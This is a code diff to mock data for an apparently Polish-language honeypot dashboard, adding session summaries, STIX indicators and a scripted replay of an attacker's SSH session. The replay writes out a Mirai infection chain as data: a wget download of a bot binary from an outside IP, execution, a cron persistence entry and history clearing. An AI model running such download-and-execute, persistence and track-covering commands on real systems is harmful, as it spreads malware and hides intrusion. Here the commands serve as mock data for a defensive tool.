@@ -5,6 +5,7 @@ import type {
   HoneypotEventType,
   SensorType,
   SessionReplay,
+  SessionSummary,
   StixBundle,
   ThreatActor,
 } from '@/types/api';
@@ -327,34 +328,150 @@ export const MOCK_ACTORS: ThreatActor[] = [
   },
 ];
 
-export function generateSessionReplay(sessionId: string): SessionReplay {
-  const frames = [
-    {
-      offsetMs: 0,
-      type: 'o' as const,
-      data: 'Welcome to Ubuntu 22.04.3 LTS\r\nroot@web-prod-01:~# ',
-    },
-    { offsetMs: 1200, type: 'i' as const, data: 'uname -a\r' },
-    {
-      offsetMs: 1350,
-      type: 'o' as const,
-      data: 'Linux web-prod-01 5.15.0-91-generic x86_64 GNU/Linux\r\nroot@web-prod-01:~# ',
-    },
-    { offsetMs: 4100, type: 'i' as const, data: 'wget http://185.224.128.43/bins/mirai.x86\r' },
-    {
-      offsetMs: 4900,
-      type: 'o' as const,
-      data: 'Connecting to 185.224.128.43... connected.\r\nmirai.x86 saved [112640/112640]\r\nroot@web-prod-01:~# ',
-    },
-    { offsetMs: 7300, type: 'i' as const, data: 'chmod +x mirai.x86 && ./mirai.x86\r' },
-    { offsetMs: 7800, type: 'o' as const, data: 'listening tun0\r\n' },
-  ];
-  return {
-    sessionId,
-    attackerIp: randomIp(),
+/** Static list of capturable SSH sessions surfaced on the Sessions page. */
+export const MOCK_SESSIONS: SessionSummary[] = [
+  {
+    sessionId: 'sess-4817',
+    attackerIp: '185.224.128.43',
     sensorId: 'hp-ssh-weu-01',
     startedAt: new Date(Date.now() - 600_000).toISOString(),
-    durationMs: 8000,
+    durationMs: 21_400,
+    commandCount: 9,
+    hasTty: true,
+    country: 'NL',
+    countryName: 'Holandia',
+  },
+  {
+    sessionId: 'sess-6390',
+    attackerIp: '45.95.147.236',
+    sensorId: 'hp-ssh-neu-02',
+    startedAt: new Date(Date.now() - 3_600_000).toISOString(),
+    durationMs: 12_800,
+    commandCount: 5,
+    hasTty: true,
+    country: 'RU',
+    countryName: 'Rosja',
+  },
+  {
+    sessionId: 'sess-7721',
+    attackerIp: '117.50.22.8',
+    sensorId: 'hp-ssh-eus-03',
+    startedAt: new Date(Date.now() - 7_200_000).toISOString(),
+    durationMs: 8_900,
+    commandCount: 4,
+    hasTty: true,
+    country: 'CN',
+    countryName: 'Chiny',
+  },
+  {
+    sessionId: 'sess-1102',
+    attackerIp: '8.219.44.102',
+    sensorId: 'hp-ssh-weu-01',
+    startedAt: new Date(Date.now() - 86_400_000).toISOString(),
+    durationMs: 0,
+    commandCount: 0,
+    hasTty: false,
+    country: 'US',
+    countryName: 'Stany Zjednoczone',
+  },
+];
+
+const PROMPT = 'root@web-prod-01:~# ';
+
+/**
+ * A realistic attacker SSH session: banner → recon → download → persist → run.
+ * 'i' frames are attacker keystrokes (echoed), 'o' frames are honeypot output.
+ */
+export function generateSessionReplay(sessionId: string): SessionReplay {
+  const summary = MOCK_SESSIONS.find((s) => s.sessionId === sessionId);
+
+  // Sessions explicitly flagged as having no TTY return an empty frame list so
+  // the UI can render the "Brak nagrania TTY" empty state.
+  if (summary && !summary.hasTty) {
+    return {
+      sessionId,
+      attackerIp: summary.attackerIp,
+      sensorId: summary.sensorId,
+      startedAt: summary.startedAt,
+      durationMs: 0,
+      frames: [],
+    };
+  }
+
+  const frames: SessionReplay['frames'] = [
+    {
+      offsetMs: 0,
+      type: 'o',
+      data: 'Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\r\n\r\n',
+    },
+    { offsetMs: 300, type: 'o', data: ' * Documentation:  https://help.ubuntu.com\r\n\r\n' },
+    { offsetMs: 600, type: 'o', data: `Last login: Mon Jun  9 02:14:11 2026 from ${randomIp()}\r\n` },
+    { offsetMs: 900, type: 'o', data: PROMPT },
+
+    { offsetMs: 2100, type: 'i', data: 'uname -a\r' },
+    {
+      offsetMs: 2260,
+      type: 'o',
+      data: '\r\nLinux web-prod-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux\r\n' + PROMPT,
+    },
+
+    { offsetMs: 4300, type: 'i', data: 'cat /proc/cpuinfo | grep -c processor\r' },
+    { offsetMs: 4480, type: 'o', data: '\r\n4\r\n' + PROMPT },
+
+    { offsetMs: 6200, type: 'i', data: 'cd /tmp\r' },
+    { offsetMs: 6320, type: 'o', data: '\r\n' + 'root@web-prod-01:/tmp# ' },
+
+    { offsetMs: 8100, type: 'i', data: 'wget http://185.224.128.43/bins/mirai.x86 -O .x\r' },
+    {
+      offsetMs: 8300,
+      type: 'o',
+      data:
+        '\r\n--2026-06-09 02:15:03--  http://185.224.128.43/bins/mirai.x86\r\n' +
+        'Connecting to 185.224.128.43:80... connected.\r\n' +
+        'HTTP request sent, awaiting response... 200 OK\r\n' +
+        'Length: 112640 (110K) [application/octet-stream]\r\n',
+    },
+    {
+      offsetMs: 9600,
+      type: 'o',
+      data: "Saving to: '.x'\r\n\r\n.x   100%[===================>] 110.00K  --.-KB/s    in 0.04s\r\n\r\n",
+    },
+    {
+      offsetMs: 9900,
+      type: 'o',
+      data: "2026-06-09 02:15:03 (2.70 MB/s) - '.x' saved [112640/112640]\r\n\r\n" + 'root@web-prod-01:/tmp# ',
+    },
+
+    { offsetMs: 11800, type: 'i', data: 'chmod +x .x\r' },
+    { offsetMs: 11950, type: 'o', data: '\r\n' + 'root@web-prod-01:/tmp# ' },
+
+    {
+      offsetMs: 13600,
+      type: 'i',
+      data: 'echo "*/5 * * * * /tmp/.x" | crontab -\r',
+    },
+    { offsetMs: 13800, type: 'o', data: '\r\n' + 'root@web-prod-01:/tmp# ' },
+
+    { offsetMs: 15700, type: 'i', data: 'history -c\r' },
+    { offsetMs: 15850, type: 'o', data: '\r\n' + 'root@web-prod-01:/tmp# ' },
+
+    { offsetMs: 17400, type: 'i', data: './.x &\r' },
+    {
+      offsetMs: 17700,
+      type: 'o',
+      data: '\r\n[1] 21984\r\n' + 'root@web-prod-01:/tmp# ',
+    },
+    { offsetMs: 19200, type: 'o', data: 'listening tun0\r\n[INFEKCJA] dołączono do botnetu\r\n' },
+    { offsetMs: 21000, type: 'i', data: 'exit\r' },
+    { offsetMs: 21200, type: 'o', data: '\r\nlogout\r\n' },
+  ];
+
+  return {
+    sessionId,
+    attackerIp: summary?.attackerIp ?? randomIp(),
+    sensorId: summary?.sensorId ?? 'hp-ssh-weu-01',
+    startedAt: summary?.startedAt ?? new Date(Date.now() - 600_000).toISOString(),
+    durationMs: 21_400,
     frames,
   };
 }
@@ -383,6 +500,57 @@ export function generateStixBundle(): StixBundle {
           "[file:hashes.'SHA-256' = '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f']",
         labels: ['malicious-activity'],
         name: 'Mirai x86 dropper',
+      },
+      {
+        type: 'indicator',
+        id: 'indicator--a1b2c3d4-0004-4aaa-bbbb-000000000004',
+        created: now,
+        modified: now,
+        pattern: "[ipv4-addr:value = '45.95.147.236']",
+        labels: ['malicious-activity'],
+        name: 'Loader staging host',
+      },
+      {
+        type: 'indicator',
+        id: 'indicator--a1b2c3d4-0005-4aaa-bbbb-000000000005',
+        created: now,
+        modified: now,
+        pattern: "[domain-name:value = 'c2.honeybadger.example']",
+        labels: ['command-and-control'],
+        name: 'C2 dispatch domain',
+      },
+      {
+        type: 'attack-pattern',
+        id: 'attack-pattern--c3d4e5f6-0006-4ccc-dddd-000000000006',
+        created: now,
+        modified: now,
+        labels: ['T1110'],
+        name: 'Brute Force: Password Guessing',
+      },
+      {
+        type: 'attack-pattern',
+        id: 'attack-pattern--c3d4e5f6-0007-4ccc-dddd-000000000007',
+        created: now,
+        modified: now,
+        labels: ['T1053.003'],
+        name: 'Scheduled Task/Job: Cron',
+      },
+      {
+        type: 'identity',
+        id: 'identity--d4e5f6a7-0008-4ddd-eeee-000000000008',
+        created: now,
+        modified: now,
+        labels: ['organization'],
+        name: 'HoneyGrid Threat Intelligence',
+      },
+      {
+        type: 'relationship',
+        id: 'relationship--e5f6a7b8-0009-4eee-ffff-000000000009',
+        created: now,
+        modified: now,
+        relationship_type: 'indicates',
+        source_ref: 'indicator--a1b2c3d4-0001-4aaa-bbbb-000000000001',
+        target_ref: 'attack-pattern--c3d4e5f6-0007-4ccc-dddd-000000000007',
       },
       {
         type: 'threat-actor',
